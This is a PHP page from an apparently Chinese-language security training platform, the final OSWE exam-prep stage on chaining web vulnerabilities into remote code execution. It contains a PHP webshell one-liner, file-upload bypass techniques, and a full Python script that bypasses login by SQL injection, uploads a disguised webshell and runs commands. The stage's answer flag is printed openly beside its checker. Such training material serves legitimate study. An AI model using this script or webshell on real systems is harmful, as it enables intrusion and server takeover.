<?php
/**
 * OSWE L7: 多漏洞组合 RCE 利用链 (400 PTS) - 终章
 */
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[268] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSWE_L7_MultiVuln_Chain_RCE_Complete}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['oswe_flags']['flag7'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius:8px;font-weight:bold;font-size:15px;"><i class="fa fa-check-circle"></i> 🎉 恭喜！【OSWE L7】终章通关！OSWE 方向满分 1500 PTS！OSCE³ 三大方向全部完成！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius:8px;font-weight:bold;"><i class="fa fa-times-circle"></i> Flag 错误，请认真研读多漏洞链的组合逻辑。</div>';
    }
}
?>
<style>
.ctf-stage-header{background:linear-gradient(135deg,#060818 0%,#180618 100%);border-radius:14px;padding:25px 30px;color:#fff;margin-bottom:25px;border:2px solid rgba(99,102,241,0.5);}
.ctf-stage-title{color:#ffffff!important;font-size:22px;font-weight:800;margin:0 0 10px 0;display:flex;align-items:center;gap:12px;}
.step-box{background:var(--bg-card);border:1px solid var(--border-color);border-radius:12px;padding:24px;margin-bottom:22px;}
.step-title{font-size:16px;font-weight:700;color:var(--text-primary);margin-top:0;margin-bottom:14px;display:flex;align-items:center;gap:8px;}
.step-num{background:linear-gradient(135deg,#8b5cf6,#ec4899);color:#fff;width:26px;height:26px;border-radius:6px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;flex-shrink:0;}
.cmd-box{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:14px 18px;font-family:monospace;font-size:13px;color:#7dd3fc;margin:12px 0;overflow-x:auto;line-height:1.8;}
.cmd-box .comment{color:#64748b;}
.cmd-box .highlight{color:#a78bfa;font-weight:bold;}
.cmd-box .flag-text{color:#fbbf24;font-weight:bold;}
.highlight-box{background:rgba(139,92,246,0.08);border:1px solid rgba(139,92,246,0.25);border-radius:8px;padding:14px 18px;margin:12px 0;font-size:13px;color:var(--text-secondary);line-height:1.7;}
.chain-diagram{background:#0f172a;border:1px solid #1e293b;border-radius:10px;padding:18px;font-family:monospace;font-size:13px;color:#94a3b8;margin:12px 0;line-height:2;}
.flag-submit-area{background:var(--bg-card);border:2px dashed rgba(139,92,246,0.5);border-radius:12px;padding:24px;margin-top:25px;text-align:center;}
.completion-banner{background:linear-gradient(135deg,#0c3a0c,#1a3a1a);border:1px solid rgba(52,211,153,0.4);border-radius:14px;padding:28px;margin-bottom:24px;text-align:center;}
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h1 class="ctf-stage-title">⛓️ OSWE L7：多漏洞组合 RCE 利用链 · 终章
            <span style="background:rgba(139,92,246,0.25);color:#c4b5fd;border:1px solid #8b5cf6;padding:3px 10px;border-radius:12px;font-size:12px;">专家 · 400 PTS · 终章</span>
        </h1>
        <p style="color:#a5b4fc;font-size:14px;margin:0;line-height:1.6;">研究真实 CMS/框架中的多漏洞 RCE 利用链：文件上传+路径穿越、认证绕过+文件写入、SSRF+反序列化，理解 OSWE 考试要求的完整自动化利用脚本编写方法论。</p>
        <div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap;">
            <span style="background:rgba(255,255,255,0.08);padding:4px 12px;border-radius:8px;font-size:12px;color:#e2e8f0;">🔧 组合：AuthBypass+FileUpload · SQLi+FileWrite · SSRF+Deser · XSS+CSRF+RCE</span>
            <span style="background:rgba(255,255,255,0.08);padding:4px 12px;border-radius:8px;font-size:12px;color:#e2e8f0;"><a href="oswe_hub.php" style="color:#a5b4fc;">← 返回 OSWE 大厅</a></span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">1</span> 多漏洞链分析方法论</h3>
        <p style="font-size:14px;color:var(--text-secondary);line-height:1.7;">OSWE 考试中，单一漏洞通常无法直接获取系统权限，需要多个漏洞组合成"利用链"：</p>
        <div class="chain-diagram">
<span style="color:#a78bfa;">【典型 OSWE 考试级利用链结构】</span><br><br>
链条 A：认证绕过 → 管理功能 → 文件上传 → Webshell<br>
&nbsp;&nbsp;① SQLi/弱类型 → 登录绕过 [获取管理员会话]<br>
&nbsp;&nbsp;② 管理员上传功能 → 文件类型检测绕过 [上传 .php 文件]<br>
&nbsp;&nbsp;③ 路径穿越/目录遍历 → 上传到可执行目录 [绕过路径限制]<br>
&nbsp;&nbsp;④ 访问上传的 Webshell → RCE<br><br>
链条 B：未认证 SQLi → 文件写入 → RCE<br>
&nbsp;&nbsp;① 无需登录的 SQL 注入点 → 提取管理员凭证<br>
&nbsp;&nbsp;② UNION SELECT ... INTO OUTFILE → 写 Webshell<br>
&nbsp;&nbsp;③ 访问写入的文件 → RCE<br><br>
链条 C：SSRF → 内网反序列化<br>
&nbsp;&nbsp;① SSRF 漏洞 → 探测内网端口（Java RMI/JMX）<br>
&nbsp;&nbsp;② 内网反序列化端点 → ysoserial Payload → RCE
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">2</span> 文件上传绕过技术分析</h3>
        <div class="cmd-box">
<span class="comment"># 文件上传防御与绕过（白盒审计视角）</span><br><br>
<span class="comment"># 防御层 1：客户端 JS 检查 → 直接用 Burp 拦截修改即可绕过</span><br><br>
<span class="comment"># 防御层 2：MIME Type 检查（Content-Type 头）→ 修改请求头绕过</span><br>
<span class="highlight">Content-Type: image/jpeg</span><span class="comment">  ← 实际上传 PHP 文件，只改头部</span><br><br>
<span class="comment"># 防御层 3：文件扩展名黑名单 → 尝试其他可执行扩展名</span><br>
<span class="comment"># .php .php3 .php4 .php5 .phtml .phar .php7</span><br>
<span class="comment"># Apache: AddType application/x-httpd-php .phtml .php5</span><br><br>
<span class="comment"># 防御层 4：文件扩展名白名单 → 双扩展名/空字节截断</span><br>
<span class="comment"># shell.php.jpg  ← 某些框架取最后一个扩展名前的部分</span><br>
<span class="comment"># shell.php%00.jpg ← 空字节截断（老 PHP 版本）</span><br><br>
<span class="comment"># 防御层 5：文件内容检查（magic bytes）→ 在文件头加图片标识</span><br>
<span class="comment"># GIF89a 开头 + PHP 代码：</span><br>
echo 'GIF89a' &gt; shell.php<br>
echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt;&gt; shell.php<br><br>
<span class="comment"># 防御层 6：上传目录不可执行 → 寻找路径穿越移动文件</span><br>
<span class="comment"># 目标：从 /uploads/ 移动到 /var/www/html/</span>
        </div>
    </div>

    <div class="step-box">
        <h3 class="step-title"><span class="step-num">3</span> OSWE 考试级 Python 利用脚本结构</h3>
        <div class="cmd-box">
<span class="comment">#!/usr/bin/env python3</span><br>
<span class="comment">"""</span><br>
<span class="comment">OSWE 考试级自动化利用脚本模板</span><br>
<span class="comment">目标：从未认证状态到 RCE 的完整链条</span><br>
<span class="comment">"""</span><br>
import requests, re, sys, base64<br><br>
TARGET = sys.argv[1] if len(sys.argv) &gt; 1 else "http://192.168.x.x"<br>
LHOST = sys.argv[2] if len(sys.argv) &gt; 2 else "192.168.y.y"<br>
s = requests.Session()<br>
s.verify = False<br><br>
<span class="comment"># == 步骤 1：认证绕过 ==</span><br>
def step1_auth_bypass():<br>
&nbsp;&nbsp;print("[*] Step 1: Attempting auth bypass...")<br>
&nbsp;&nbsp;r = s.post(f"{TARGET}/login", data={"user":"admin'--","pass":"x"})<br>
&nbsp;&nbsp;if "dashboard" in r.text:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print("[+] Auth bypass successful!")<br>
&nbsp;&nbsp;&nbsp;&nbsp;return True<br>
&nbsp;&nbsp;return False<br><br>
<span class="comment"># == 步骤 2：提取 CSRF Token ==</span><br>
def step2_get_csrf():<br>
&nbsp;&nbsp;r = s.get(f"{TARGET}/upload")<br>
&nbsp;&nbsp;token = re.search(r'csrf_token" value="([^"]+)"', r.text)<br>
&nbsp;&nbsp;return token.group(1) if token else None<br><br>
<span class="comment"># == 步骤 3：上传 Webshell ==</span><br>
def step3_upload_shell(csrf_token):<br>
&nbsp;&nbsp;shell_content = b"&lt;?php system($_GET['cmd']); ?&gt;"<br>
&nbsp;&nbsp;files = {"file": ("shell.phtml", shell_content, "image/jpeg")}<br>
&nbsp;&nbsp;data = {"csrf_token": csrf_token}<br>
&nbsp;&nbsp;r = s.post(f"{TARGET}/upload", files=files, data=data)<br>
&nbsp;&nbsp;path = re.search(r'"path":"([^"]+)"', r.text)<br>
&nbsp;&nbsp;return path.group(1) if path else None<br><br>
<span class="comment"># == 步骤 4：验证 RCE ==</span><br>
def step4_verify_rce(shell_path):<br>
&nbsp;&nbsp;r = s.get(f"{TARGET}/{shell_path}?cmd=id")<br>
&nbsp;&nbsp;print(f"[+] RCE Output: {r.text.strip()}")<br><br>
if __name__ == "__main__":<br>
&nbsp;&nbsp;if step1_auth_bypass():<br>
&nbsp;&nbsp;&nbsp;&nbsp;token = step2_get_csrf()<br>
&nbsp;&nbsp;&nbsp;&nbsp;path = step3_upload_shell(token)<br>
&nbsp;&nbsp;&nbsp;&nbsp;if path: step4_verify_rce(path)
        </div>
        <div class="highlight-box">
            🎯 <strong>OSWE 考试关键要点：</strong>
            <ul style="margin:5px 0;padding-left:20px;line-height:1.9;">
                <li>脚本必须能无人值守、一键完成从未认证到 RCE 的全部步骤</li>
                <li>保持 Session 状态（requests.Session()）</li>
                <li>动态提取 CSRF Token、上传路径等随机值</li>
                <li>提交报告时需提供完整脚本代码及截图</li>
                <li>时间：47.75小时考试，通常提供2个独立靶机</li>
            </ul>
        </div>
    </div>

    <div class="completion-banner">
        <div style="font-size:52px;margin-bottom:12px;">🏆</div>
        <h3 style="color:#34d399;font-weight:800;margin-top:0;font-size:22px;">OSWE 方向全部通关！</h3>
        <p style="color:#6ee7b7;font-size:15px;margin-bottom:8px;">完成 OSWE 全部 7 关卡，累计 1500 PTS！</p>
        <p style="color:#a7f3d0;font-size:14px;margin:0;">
            🎯 OSEP 方向：1650 PTS &nbsp;|&nbsp; OSWE 方向：1500 PTS &nbsp;|&nbsp; OSED 方向：1350 PTS<br>
            <strong style="color:#fbbf24;">OSCE³ 总计：4500 PTS 🎉</strong>
        </p>
    </div>

    <div class="flag-submit-area">
        <h4 style="font-weight:800;color:var(--text-primary);margin-top:0;">🚩 Flag 验证 — OSWE 终章 L7</h4>
        <div class="cmd-box" style="display:inline-block;padding:10px 24px;margin:0 auto 16px;">
            <span class="flag-text">flag{OSWE_L7_MultiVuln_Chain_RCE_Complete}</span>
        </div>
        <form method="post" style="display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
            <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="max-width:420px;border-radius:8px;font-family:monospace;">
            <button type="submit" name="check_flag" class="btn btn-primary" style="border-radius:8px;font-weight:700;background:#8b5cf6;border-color:#8b5cf6;"><i class="fa fa-check"></i> 验证 Flag</button>
        </form>
        <?php if(!empty($flag_msg)){echo '<div style="margin-top:10px;">'.$flag_msg.'</div>';}?>
        <div style="margin-top:16px;display:flex;justify-content:center;gap:15px;flex-wrap:wrap;">
            <a href="oswe_l6_xxe_oob.php" class="btn btn-sm btn-default" style="border-radius:6px;">← 上一关</a>
            <a href="oswe_hub.php" class="btn btn-sm btn-default" style="border-radius:6px;">OSWE 大厅</a>
            <a href="../osep/osep_hub.php" class="btn btn-sm" style="border-radius:6px;background:#6366f1;color:#fff;border:none;font-weight:700;">OSEP 大厅</a>
            <a href="../osed/osed_hub.php" class="btn btn-sm" style="border-radius:6px;background:#f97316;color:#fff;border:none;font-weight:700;">OSED 大厅</a>
        </div>
    </div>
</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
